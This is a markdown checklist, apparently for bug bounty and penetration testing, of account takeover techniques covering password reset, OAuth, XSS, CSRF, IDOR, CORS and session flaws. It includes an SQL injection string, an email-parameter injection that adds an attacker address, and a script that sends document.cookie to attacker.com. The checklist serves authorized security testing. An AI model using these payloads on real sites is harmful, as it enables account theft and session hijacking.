# Account Takeover (ATO) Checklist

## Login-Based ATO

### Brute Force
- [ ] Password brute force (no rate limit)
- [ ] OTP brute force (4-6 digit codes)
- [ ] Username enumeration via error messages
- [ ] Username enumeration via response timing

### Authentication Bypass
- [ ] SQL injection: `admin" or 1=1;--`
- [ ] JWT misconfiguration (alg:none, weak secret)
- [ ] OAuth misconfigurations
- [ ] OTP/Token not validated server-side

---

## Password Reset ATO

### Token Issues
- [ ] Token not expiring after use
- [ ] Token not expiring after new request
- [ ] Token predictability (timestamp, user ID based)
- [ ] Weak token entropy

### Token Leakage
- [ ] Token in HTTP response body
- [ ] Token in Referer header
- [ ] Token in URL (logged in server/proxy)

### Manipulation
- [ ] Host header injection (password reset link)
- [ ] HTTP Parameter Pollution (HPP)
- [ ] Email parameter: `victim@mail.com,attacker@mail.com`
- [ ] IDOR on reset endpoint
- [ ] Change email param while using attacker's token

---

## Pre-Account Takeover

### Registration Flow
```
1. Register with victim@email.com (don't verify)
2. Victim signs up via OAuth (Google/Facebook)
3. App links both accounts (same email)
4. Attacker logs in with password → accesses victim data
```

### Conditions
- [ ] Email not verified before account creation
- [ ] OAuth signup doesn't check existing unverified accounts

---

## OAuth ATO

### Misconfigurations
- [ ] Missing state parameter (CSRF)
- [ ] Weak state parameter
- [ ] Token leakage via Referer
- [ ] Open redirect in redirect_uri
- [ ] Account linking without verification

**Reference**: https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover

---

## XSS to ATO

### Cookie Theft
```html
<script>
var img = document.createElement('img');
img.src = "http://attacker.com/?c=" + document.cookie;
document.body.appendChild(img);
</script>
```

### When HttpOnly is Set
- [ ] Steal CSRF token → change email/password
- [ ] Steal auth tokens from localStorage
- [ ] Subdomain XSS → cookie scope exploitation

---

## CSRF to ATO

- [ ] Email change endpoint lacks CSRF token
- [ ] Password change endpoint lacks CSRF token
- [ ] No re-authentication for sensitive actions

---

## IDOR to ATO

- [ ] Email change endpoint vulnerable to IDOR
- [ ] Password change endpoint vulnerable to IDOR
- [ ] Password reset endpoint vulnerable to IDOR
- [ ] Profile update changes other user's data

---

## Response Manipulation

- [ ] Change `"success":false` to `"success":true`
- [ ] Change `"authenticated":false` to `true`
- [ ] Bypass 2FA by modifying response
- [ ] Status code manipulation (403 → 200)

---

## CORS to ATO

- [ ] `Access-Control-Allow-Origin: *` with credentials
- [ ] Origin reflection without validation
- [ ] `Origin: null` accepted

**Reference**: https://book.hacktricks.xyz/pentesting-web/cors-bypass

---

## Advanced Techniques

### HTTP Request Smuggling
- [ ] Smuggle requests to hijack sessions
- **H1 Reports**: 
  - https://hackerone.com/reports/737140
  - https://hackerone.com/reports/740037

### Session Fixation
- [ ] Session ID not regenerated after login
- [ ] Session ID accepted from URL parameter

### Leaked Session
- [ ] Session token in URL
- [ ] Session in error messages
- [ ] Session in client-side storage

---

## Signup/Registration ATO

- [ ] Register with victim's email (no verification)
- [ ] Phone number instead of email in OAuth flow
- [ ] Link victim email to attacker's OAuth account

---

## References
- https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
- https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5
